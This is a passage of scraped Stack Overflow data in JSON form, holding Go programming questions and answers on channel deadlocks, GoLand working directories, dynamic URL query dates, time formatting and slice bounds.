{"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "edited": false, "score": 0, "creation_date": 1540289006, "post_id": 52946237, "comment_id": 92800676, "body": "Thanks but I am still not getting it. I know the reason behind the deadlock. But using go routine will let me range over channels. And one more question comes to my mind now why is it working in the main. It will be appreciated if you provide an reference example for the reason behind do&#39;s and don&#39;t&#39;s."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540301819, "post_id": 52946237, "comment_id": 92808820, "body": "You&#39;re not getting a deadlock with a goroutine because the writes are in the goroutine. That goroutine blocks, the outer function returns the channel, the caller of that func starts reading from it, and the inner goroutine is then able to send on it."}, {"owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "reply_to_user": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540355166, "post_id": 52946237, "comment_id": 92828879, "body": "@Adrian thanks for your comment but It  is our assumption. It is not mentioned anywhere inside the docs. Also If I knew that it will help my or anyone in future to know how actually channels wait even if there is no buffer or no value is coming from other end. I have experimented a lot. For example have a look at this <a href=\"https://play.golang.org/p/owLc5QoAROa\" rel=\"nofollow noreferrer\">play.golang.org/p/owLc5QoAROa</a>."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540381004, "post_id": 52946237, "comment_id": 92842186, "body": "The relevant facts are definitely mentioned, ie that channel operations can block, and that goroutines run concurrently. Your specific example is just an application of those fundamentals."}], "tags": [], "owner": {"reputation": 64542, "user_id": 10008173, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3ea5d6d5d63e054acb8cfa95a39240d?s=128&d=identicon&r=PG&f=1", "display_name": "David Maze", "link": "https://stackoverflow.com/users/10008173/david-maze"}, "is_accepted": false, "score": 1, "last_activity_date": 1540288767, "creation_date": 1540288767, "answer_id": 52946237, "question_id": 52943450, "link": "https://stackoverflow.com/questions/52943450/go-routine-for-range-over-channels/52946237#52946237", "title": "go routine for range over channels", "body": "<p>Your function creates a channel, writes to it, then returns it.  The writing will block until somebody can read the corresponding value, but that's impossible because nobody outside this function has the channel yet.</p>\n\n<pre><code>func sq(in &lt;-chan int) &lt;-chan int {\n    // Nobody else has this channel yet...\n    out := make(chan int)\n    for n := range in {\n        // ...but this line will block until somebody reads the value...\n        out &lt;- n * n\n    }\n    close(out)\n    // ...and nobody else can possibly read it until after this return.\n    return out\n}\n</code></pre>\n\n<p>If you wrap the loop in a goroutine then both the loop and the <code>sq</code> function are allowed to continue; even if the loop blocks, the <code>return out</code> statement can still go and eventually you'll be able to connect up a reader to the channel.</p>\n\n<p>(There's nothing intrinsically bad about looping over channels outside of goroutines; your <code>main</code> function does it harmlessly and correctly.)</p>\n"}, {"tags": [], "owner": {"reputation": 4150, "user_id": 1241464, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/090f6b7a1f3d845468af273b5accedc9?s=128&d=identicon&r=PG", "display_name": "Ron", "link": "https://stackoverflow.com/users/1241464/ron"}, "is_accepted": false, "score": 0, "last_activity_date": 1553289343, "creation_date": 1553289343, "answer_id": 55307878, "question_id": 52943450, "link": "https://stackoverflow.com/questions/52943450/go-routine-for-range-over-channels/55307878#55307878", "title": "go routine for range over channels", "body": "<p>The reason of the deadlock is because the main is waiting for the <code>sq</code> return and finish, but the <code>sq</code> is waiting for someone read the chan then it can continue. </p>\n\n<p>I simplified your code by removing layer of sq call, and split one sentence into 2 :</p>\n\n<pre><code>func main() {\n    result := sq(gen(3, 4)) // &lt;-- block here, because sq doesn't return\n    for n := range result { \n        fmt.Println(n)\n    }\n    fmt.Println(\"Process completed\")\n}\n\nfunc gen(nums ...int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for _, n := range nums {\n            out &lt;- n\n        }\n        close(out)\n    }()\n    return out\n}\n\nfunc sq(in &lt;-chan int) &lt;-chan int {\n    out := make(chan int)\n    for n := range in {\n        out &lt;- n * n   // &lt;-- block here, because no one is reading from the chan\n    }\n    close(out)\n    return out\n}\n</code></pre>\n\n<p>In sq method, if you put code in <code>goroutine</code>, then the <code>sq</code> will returned, and main func will not block, and consume the result queue, and the <code>goroutine</code> will continue, then there is no block any more.</p>\n\n<pre><code>func main() {\n    result := sq(gen(3, 4)) // will not blcok here, because the sq just start a goroutine and return\n    for n := range result {\n        fmt.Println(n)\n    }\n    fmt.Println(\"Process completed\")\n}\n\nfunc gen(nums ...int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for _, n := range nums {\n            out &lt;- n\n        }\n        close(out)\n    }()\n    return out\n}\n\nfunc sq(in &lt;-chan int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for n := range in {\n            out &lt;- n * n // will not block here, because main will continue and read the out chan\n        }\n        close(out)\n    }()\n    return out\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 15128810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0903eb3b77ecb7cc27a0c8958a49b779?s=128&d=identicon&r=PG&f=1", "display_name": "coster", "link": "https://stackoverflow.com/users/15128810/coster"}, "is_accepted": false, "score": 0, "last_activity_date": 1612258870, "creation_date": 1612258870, "answer_id": 66007089, "question_id": 52943450, "link": "https://stackoverflow.com/questions/52943450/go-routine-for-range-over-channels/66007089#66007089", "title": "go routine for range over channels", "body": "<p>The code is a bit complicated,\nLet's simplify</p>\n<p>First eq below, not has deadLock</p>\n<pre><code>func main() {\n    send := make(chan int)\n    receive := make(chan int)\n    go func() {\n        send&lt;-3\n        send&lt;-4\n        close(send)\n    }()\n    go func() {\n        receive&lt;- &lt;-send\n        receive&lt;- &lt;-send\n        close(receive)\n    }()\n    for v := range receive{\n        fmt.Println(v)\n\n    }\n}\n</code></pre>\n<p>Second eq below,remove &quot;go&quot; has deadLock</p>\n<pre><code>func main() {\n    send := make(chan int)\n    receive := make(chan int)\n    go func() {\n        send&lt;-3\n        send&lt;-4\n        close(send)\n    }()\n    receive&lt;- &lt;-send\n    receive&lt;- &lt;-send\n    close(receive)\n    for v := range receive{\n        fmt.Println(v)\n\n    }\n}\n</code></pre>\n<p>Let's simplify second code again</p>\n<pre><code>func main() {\n    ch := make(chan int)\n    ch &lt;- 3\n    ch &lt;- 4\n    close(ch)\n    for v := range ch{\n        fmt.Println(v)\n\n    }\n}\n</code></pre>\n<p>The reason of the deadlock is no buffer channel waiting in main goroutine.</p>\n<p>Two Solutions</p>\n<pre><code>// add more cap then &quot;channel&lt;-&quot; time\nfunc main() {\n    ch := make(chan int,2)\n    ch &lt;- 3\n    ch &lt;- 4\n    close(ch)\n    for v := range ch{\n        fmt.Println(v)\n\n    }\n}\n\n//async &quot;&lt;-channel&quot;\nfunc main() {\n    ch := make(chan int)\n    go func() {\n        for v := range ch {\n            fmt.Println(v)\n        }\n    }()\n    ch &lt;- 3\n    ch &lt;- 4\n    close(ch)\n}\n</code></pre>\n"}], "owner": {"reputation": 8884, "user_id": 5821354, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qc8o0.jpg?s=128&g=1", "display_name": "Himanshu", "link": "https://stackoverflow.com/users/5821354/himanshu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7535, "favorite_count": 1, "answer_count": 4, "score": 2, "last_activity_date": 1612258870, "creation_date": 1540279813, "last_edit_date": 1540283635, "question_id": 52943450, "link": "https://stackoverflow.com/questions/52943450/go-routine-for-range-over-channels", "title": "go routine for range over channels", "body": "<p>I have been working in Golang for a long time. But still I am facing this problem though I know the solution to my problem. But never figured out why is it happening.</p>\n\n<p>For example If I have a pipeline situation for inbound and outbound channels like below:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    for n := range sq(sq(gen(3, 4))) {\n        fmt.Println(n)\n    }\n    fmt.Println(\"Process completed\")\n}\n\nfunc gen(nums ...int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for _, n := range nums {\n            out &lt;- n\n        }\n        close(out)\n    }()\n    return out\n}\n\nfunc sq(in &lt;-chan int) &lt;-chan int {\n    out := make(chan int)\n    go func() {\n        for n := range in {\n            out &lt;- n * n\n        }\n        close(out)\n    }()\n    return out\n}\n</code></pre>\n\n<p>It does not give me a deadlock situation. But if I remove the go routine inside the outbound code as below:</p>\n\n<pre><code>func sq(in &lt;-chan int) &lt;-chan int {\n    out := make(chan int)\n    for n := range in {\n        out &lt;- n * n\n    }\n    close(out)\n    return out\n}\n</code></pre>\n\n<p>I received a deadlock error. Why is it so that looping over channels using range without go routine gives a deadlock.</p>\n"}, {"tags": ["go", "goland"], "comments": [{"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540278578, "post_id": 52942868, "comment_id": 92794417, "body": "&quot;I excepted the path is my current directory&quot;. Why do you expect this? You use the  path of the executable and this is a temporary build. What is wrong with os.Getwd?"}, {"owner": {"reputation": 996, "user_id": 5156646, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/d51f0ac02939a9cf8d85df751e01d21c?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Green", "link": "https://stackoverflow.com/users/5156646/jim-green"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 0, "creation_date": 1540381767, "post_id": 52942868, "comment_id": 92842655, "body": "Because sometimes I will rely on the current shell script ."}], "answers": [{"comments": [{"owner": {"reputation": 996, "user_id": 5156646, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/d51f0ac02939a9cf8d85df751e01d21c?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Green", "link": "https://stackoverflow.com/users/5156646/jim-green"}, "edited": false, "score": 0, "creation_date": 1540381895, "post_id": 52942972, "comment_id": 92842729, "body": "Does the go library have the variant to control whether in the IDE mode(run or debug) or in executable mode ?"}], "tags": [], "owner": {"reputation": 41009, "user_id": 450989, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YGjdr.jpg?s=128&g=1", "display_name": "Grzegorz \u017bur", "link": "https://stackoverflow.com/users/450989/grzegorz-%c5%bbur"}, "is_accepted": false, "score": -1, "last_activity_date": 1540278023, "creation_date": 1540278023, "answer_id": 52942972, "question_id": 52942868, "link": "https://stackoverflow.com/questions/52942868/goland-cant-get-the-correct-current-path-when-run-and-debug/52942972#52942972", "title": "Goland can&#39;t get the correct current path when run and debug?", "body": "<p>I recommend adding a debug parameter.</p>\n\n<pre><code>package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n)\n\nfunc main() {\n    var debug bool\n    flag.BoolVar(&amp;debug, \"d\", false, \"debug\")\n    flag.Parse()\n    fmt.Println(debug)\n}\n</code></pre>\n\n<p>Then pass <code>-d</code> it when you run the program from your IDE.</p>\n"}, {"comments": [{"owner": {"reputation": 996, "user_id": 5156646, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/d51f0ac02939a9cf8d85df751e01d21c?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Green", "link": "https://stackoverflow.com/users/5156646/jim-green"}, "edited": false, "score": 1, "creation_date": 1540381942, "post_id": 52949462, "comment_id": 92842760, "body": "Thank you, It works when I set the output directory."}, {"owner": {"reputation": 5861, "user_id": 951414, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/82155035c493a583d2d92aa1d13eaf7e?s=128&d=identicon&r=PG", "display_name": "dlsniper", "link": "https://stackoverflow.com/users/951414/dlsniper"}, "reply_to_user": {"reputation": 996, "user_id": 5156646, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/d51f0ac02939a9cf8d85df751e01d21c?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Green", "link": "https://stackoverflow.com/users/5156646/jim-green"}, "edited": false, "score": 0, "creation_date": 1540386039, "post_id": 52949462, "comment_id": 92845587, "body": "That makes sense as you read the location of the binary itself instead of the working directory."}], "tags": [], "owner": {"reputation": 5861, "user_id": 951414, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/82155035c493a583d2d92aa1d13eaf7e?s=128&d=identicon&r=PG", "display_name": "dlsniper", "link": "https://stackoverflow.com/users/951414/dlsniper"}, "is_accepted": true, "score": 4, "last_activity_date": 1540298777, "creation_date": 1540298777, "answer_id": 52949462, "question_id": 52942868, "link": "https://stackoverflow.com/questions/52942868/goland-cant-get-the-correct-current-path-when-run-and-debug/52949462#52949462", "title": "Goland can&#39;t get the correct current path when run and debug?", "body": "<p>In order to fix this, go to <code>Run | Edit Configuration... | &lt;name of your configuration&gt;</code>  and change the <code>Working Directory</code> property in order to change the working directory of the application or configure the <code>Output directory</code> in order to configure where the binary is created and run from (by default it's in the temporary directory of your OS).</p>\n"}], "owner": {"reputation": 996, "user_id": 5156646, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/d51f0ac02939a9cf8d85df751e01d21c?s=128&d=identicon&r=PG&f=1", "display_name": "Jim Green", "link": "https://stackoverflow.com/users/5156646/jim-green"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 926, "favorite_count": 0, "accepted_answer_id": 52949462, "answer_count": 2, "score": 1, "last_activity_date": 1540298777, "creation_date": 1540277628, "last_edit_date": 1540286169, "question_id": 52942868, "link": "https://stackoverflow.com/questions/52942868/goland-cant-get-the-correct-current-path-when-run-and-debug", "title": "Goland can&#39;t get the correct current path when run and debug?", "body": "<p>When I invoke the following code,</p>\n\n<pre><code> func GetCurrentDirectory() string {\n    dir, err := filepath.Abs(filepath.Dir(os.Args[0])) \n</code></pre>\n\n<p>it returns:</p>\n\n<blockquote>\n  <p>/private/var/folders/cg/mwzlhrjs5y55ny553g6xz9tr0000gn/T</p>\n</blockquote>\n\n<p>Absolutely, it is a temp path, I excepted the path is my current directory, not temporary directory.</p>\n\n<pre><code>dir, err := filepath.Abs(\"\")\n</code></pre>\n\n<p>could help me,but I must judge whether in run\u3001debug mode in goland or not</p>\n"}, {"tags": ["rest", "go"], "comments": [{"owner": {"reputation": 2367, "user_id": 3860531, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001547387955/picture?type=large", "display_name": "Sumesh TG", "link": "https://stackoverflow.com/users/3860531/sumesh-tg"}, "edited": false, "score": 1, "creation_date": 1540276583, "post_id": 52942512, "comment_id": 92793431, "body": "Please include code snippet."}, {"owner": {"reputation": 33, "user_id": 9963364, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-uxL_-UHkgpY/AAAAAAAAAAI/AAAAAAAAAAw/SKL1UAEGf_M/photo.jpg?sz=128", "display_name": "Dipikanta Dutta", "link": "https://stackoverflow.com/users/9963364/dipikanta-dutta"}, "reply_to_user": {"reputation": 2367, "user_id": 3860531, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001547387955/picture?type=large", "display_name": "Sumesh TG", "link": "https://stackoverflow.com/users/3860531/sumesh-tg"}, "edited": false, "score": 0, "creation_date": 1540301876, "post_id": 52942512, "comment_id": 92808851, "body": "Added dummy code snippet"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540301932, "post_id": 52942512, "comment_id": 92808900, "body": "Not dummy code line. Running code - preferably a <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a>."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 9963364, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-uxL_-UHkgpY/AAAAAAAAAAI/AAAAAAAAAAw/SKL1UAEGf_M/photo.jpg?sz=128", "display_name": "Dipikanta Dutta", "link": "https://stackoverflow.com/users/9963364/dipikanta-dutta"}, "edited": false, "score": 0, "creation_date": 1540279320, "post_id": 52942601, "comment_id": 92794831, "body": "I have updated my question..could you please have a look at it?"}], "tags": [], "owner": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "is_accepted": false, "score": 0, "last_activity_date": 1540276984, "last_edit_date": 1540276984, "creation_date": 1540276679, "answer_id": 52942601, "question_id": 52942512, "link": "https://stackoverflow.com/questions/52942512/how-to-pass-dynamic-parameter-in-the-rest-api-url-using-golang/52942601#52942601", "title": "how to pass dynamic parameter in the REST API url using golang", "body": "<p>You can use the <code>time</code> package to create your date programmatically and format it for your query.</p>\n\n<p>To do that, you can use <a href=\"https://godoc.org/time#Time.Format\" rel=\"nofollow noreferrer\"><code>time.Format()</code></a>. For example to get your time in the format of <code>yyyy-MM-dd HH:mm:ss</code> you can use the format string \"2006-01-02 15:04:05\" as the parameter to <code>time.Format</code>.</p>\n\n<pre><code>t := time.Now()\nfmt.Println(t.Format(\"2006-01-02 15:04:05\"))\n</code></pre>\n\n<p>Will output</p>\n\n<pre><code>2009-11-10 23:00:00\n</code></pre>\n\n<p>See the documentation of the <a href=\"https://godoc.org/time\" rel=\"nofollow noreferrer\">time</a> library</p>\n"}], "owner": {"reputation": 33, "user_id": 9963364, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-uxL_-UHkgpY/AAAAAAAAAAI/AAAAAAAAAAw/SKL1UAEGf_M/photo.jpg?sz=128", "display_name": "Dipikanta Dutta", "link": "https://stackoverflow.com/users/9963364/dipikanta-dutta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 629, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1540278338, "creation_date": 1540276335, "last_edit_date": 1540278338, "question_id": 52942512, "link": "https://stackoverflow.com/questions/52942512/how-to-pass-dynamic-parameter-in-the-rest-api-url-using-golang", "title": "how to pass dynamic parameter in the REST API url using golang", "body": "<p>I am getting the encoded url from postman (google api). In the url, I have the query written to fetch info from a db. In the query, I have hardcoded the date parameter for which I want to fetch the data. But when I am using the encoded query in my code (written in golang), I want the date parameter to be coming from a variable which should be changing on daily basis. But in no way I am able to pass this dynamic variable in the url. Any help on this?</p>\n\n<p>Code snippet:</p>\n\n<pre><code>https://*************/?q='Last Date' &gt;= \"09/04/2018 12:00:00 AM \" and 'Last Date' &lt;= \"10/04/2018 11:59:59 PM\"&amp;fields=values(ID, Name)\n</code></pre>\n\n<p>This is the url I'm using in postman and I am getting an encoded url in return something like this:</p>\n\n<pre><code>\"https://*************************/?q=Last%20Date'%20%3E%3D%20%2209%2F04%2F2018%2012%3A00%3A00%20AM%20%22%20and%20'Last%20Date'%20%3C%3D%20%2210%2F04%2F2018%2011%3A59%3A59%20PM%22&amp;fields=values(ID%2CName)\n</code></pre>\n\n<p>In place of Last Date (which is hard coded in url), I am trying to use a variable which has the dates coming from somewhere else (dynamic variable), something like this:</p>\n\n<pre><code>i:= RunDate.AddDate(0, 0, 1)\n</code></pre>\n\n<p>I want to add 'i' in place of Last Date in the query, but by doing so, it's throwing error</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 38307, "user_id": 2057388, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ceef8c04f66cd0e2bd360ef6abc14a81?s=128&d=identicon&r=PG", "display_name": "\u0417\u0435\u043b\u0451\u043d\u044b\u0439", "link": "https://stackoverflow.com/users/2057388/%d0%97%d0%b5%d0%bb%d1%91%d0%bd%d1%8b%d0%b9"}, "edited": false, "score": 1, "creation_date": 1540274720, "post_id": 52942042, "comment_id": 92792618, "body": "You&#39;re trying to convert int to string but <a href=\"https://golang.org/pkg/time/#Now\" rel=\"nofollow noreferrer\"><code>time.Now()</code></a> doesnt return an int."}, {"owner": {"reputation": 704, "user_id": 4792552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a528513962a9c962ff32df92a1a350b?s=128&d=identicon&r=PG", "display_name": "Berkant Ipek", "link": "https://stackoverflow.com/users/4792552/berkant-ipek"}, "edited": false, "score": 2, "creation_date": 1540274797, "post_id": 52942042, "comment_id": 92792650, "body": "<code>time.Now().Unix()</code> will return you an int64 epoch. Go is a strongly-typed language. That&#39;s why <code>Itoa</code> won&#39;t accept <code>time.Time</code>, the type of the <code>Now()</code>. The compiler won&#39;t cast anything unless it&#39;s untyped constant/literal."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540276093, "post_id": 52942042, "comment_id": 92793207, "body": "What is the type of time.Now()? why is it hard to figure out what that return type is?"}, {"owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "edited": false, "score": 1, "creation_date": 1540277429, "post_id": 52942042, "comment_id": 92793823, "body": "@MrCholo the type of time.Now() is <code>time.Time</code> (as in Time itself is a type). We can check it via the ff Go code <code>fmt.Printf(&quot;the type of time is %T&quot;, time.Now())</code>."}, {"owner": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 2, "creation_date": 1540277434, "post_id": 52942042, "comment_id": 92793827, "body": "It&#39;s a <code>time.Time</code>, not sure how it is hard, as even the compiler tells you <code>cannot use time.Now() (type time.Time)</code>"}, {"owner": {"reputation": 407, "user_id": 3461549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73440cf71c71747a010d5114de459b10?s=128&d=identicon&r=PG&f=1", "display_name": "msound", "link": "https://stackoverflow.com/users/3461549/msound"}, "edited": false, "score": 1, "creation_date": 1540293788, "post_id": 52942042, "comment_id": 92803630, "body": "Please refer to documentation of standard library to figure out return types. In this case, you can find it at: <a href=\"https://golang.org/pkg/time/#Now\" rel=\"nofollow noreferrer\">golang.org/pkg/time/#Now</a>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540329028, "post_id": 52942042, "comment_id": 92823161, "body": "I wonder why it&#39;s hard to find the return type for a call with an editor for a statically typed language"}], "answers": [{"tags": [], "owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "is_accepted": true, "score": 2, "last_activity_date": 1540277315, "creation_date": 1540277315, "answer_id": 52942787, "question_id": 52942042, "link": "https://stackoverflow.com/questions/52942042/cannot-convert-time-now-to-a-string/52942787#52942787", "title": "Cannot convert time.Now() to a string", "body": "<blockquote>\n  <p>does anyone know what that's about? I am trying to convert an int to a string here.</p>\n</blockquote>\n\n<p>Time type is not equivalent to an int. If your need is a string representation, type <code>Time</code> has a <code>String()</code> method. </p>\n\n<p>Sample code below (also available as a runnable Go Playground <a href=\"https://play.golang.org/p/RK215FlalGB\" rel=\"nofollow noreferrer\">snippet</a>):</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\n// Nearby whatever\ntype Nearby struct {\n    id          int\n    me          int\n    you         int\n    contactTime string\n}\n\nfunc main() {\n    s1 := Nearby{\n        id:          1,\n        me:          1,\n        you:         2,\n        contactTime: time.Now().String(), // &lt;-- type Time has a String() method\n    }\n\n    fmt.Printf(\"%+v\", s1)\n\n}\n</code></pre>\n\n<p>Hope this helps. Cheers,</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 535, "favorite_count": 0, "accepted_answer_id": 52942787, "answer_count": 1, "score": -5, "last_activity_date": 1540277315, "creation_date": 1540274334, "question_id": 52942042, "link": "https://stackoverflow.com/questions/52942042/cannot-convert-time-now-to-a-string", "title": "Cannot convert time.Now() to a string", "body": "<p>I have this struct:</p>\n\n<pre><code>// Nearby whatever\ntype Nearby struct {\n    id          int    `json:\"id,omitempty\"`\n    me          int    `json:\"me,omitempty\"`\n    you         int    `json:\"you,omitempty\"`\n    contactTime string `json:\"contactTime,omitempty\"`\n}\n</code></pre>\n\n<p>and then I call this:</p>\n\n<pre><code>strconv.Itoa(time.Now())\n</code></pre>\n\n<p>like so:</p>\n\n<pre><code>s1 := Nearby{id: 1, me: 1, you: 2, contactTime: strconv.Itoa(time.Now())}\n</code></pre>\n\n<p>but it says:</p>\n\n<blockquote>\n<pre><code>&gt; cannot use time.Now() (type time.Time) as type int in argument to\n&gt; strconv.Itoa\n</code></pre>\n</blockquote>\n\n<p>does anyone know what that's about? I am trying to convert an int to a string here.</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 1, "creation_date": 1540272286, "post_id": 52941674, "comment_id": 92791780, "body": "A slice can have zero elements. <code>list[1:]</code> is an example of such a slice."}], "answers": [{"tags": [], "owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "is_accepted": false, "score": 2, "last_activity_date": 1540273204, "creation_date": 1540273204, "answer_id": 52941834, "question_id": 52941674, "link": "https://stackoverflow.com/questions/52941674/a-slice-has-only-one-element-named-list-why-can-subslice-list1-work/52941834#52941834", "title": "A slice has only one element, named list, why can subslice list[1:] work?", "body": "<p>Well, the language simply <em>defines</em> this to be valid.</p>\n\n<p>Think of the indices used in subslicing as pointing \"between\" elements:</p>\n\n<pre><code>Slice a Elements:   | 0 | 1 | 2 | 3 | 4 | 5 |\nSubslice a[2:]              ^===============\nSubslice a[2:4]             ^===========^\nSubslice a[6:]                              ^\n</code></pre>\n\n<p>Your list[1:] slices of the empty slice.</p>\n"}], "owner": {"reputation": 11, "user_id": 8515657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d165fa3353df7b9624c1fc5aa5275f3?s=128&d=identicon&r=PG&f=1", "display_name": "Young Lu", "link": "https://stackoverflow.com/users/8515657/young-lu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1540273204, "creation_date": 1540272180, "question_id": 52941674, "link": "https://stackoverflow.com/questions/52941674/a-slice-has-only-one-element-named-list-why-can-subslice-list1-work", "title": "A slice has only one element, named list, why can subslice list[1:] work?", "body": "<p>A slice has only one element, named list, why can subslice list[1:] work?\nFor example:</p>\n\n<pre><code>list := []int{1}\nfmt.Println(list[1:])\nfmt.Println(list[1])\n</code></pre>\n\n<p>The list hasn't the element with index 1, so the third line causes \"panic: runtime error: index out of range\", but why does the second line works well?</p>\n"}, {"tags": ["go"], "answers": [{"comments": [{"owner": {"reputation": 13635, "user_id": 1061413, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/0beb915463288cb6e8b50e8121860717?s=128&d=identicon&r=PG", "display_name": "Amit Kumar Gupta", "link": "https://stackoverflow.com/users/1061413/amit-kumar-gupta"}, "edited": false, "score": 0, "creation_date": 1540271411, "post_id": 52941417, "comment_id": 92791516, "body": "No prob, glad to help!"}], "tags": [], "owner": {"reputation": 13635, "user_id": 1061413, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/0beb915463288cb6e8b50e8121860717?s=128&d=identicon&r=PG", "display_name": "Amit Kumar Gupta", "link": "https://stackoverflow.com/users/1061413/amit-kumar-gupta"}, "is_accepted": true, "score": 3, "last_activity_date": 1540270463, "creation_date": 1540270463, "answer_id": 52941417, "question_id": 52941360, "link": "https://stackoverflow.com/questions/52941360/assign-local-result-to-outer-scope/52941417#52941417", "title": "Assign local result to outer scope", "body": "<pre><code>var db *sqlx.DB\n\nfunc GetDatabaseConnection() *sqlx.DB {\n\n    if db == nil {\n        var err error 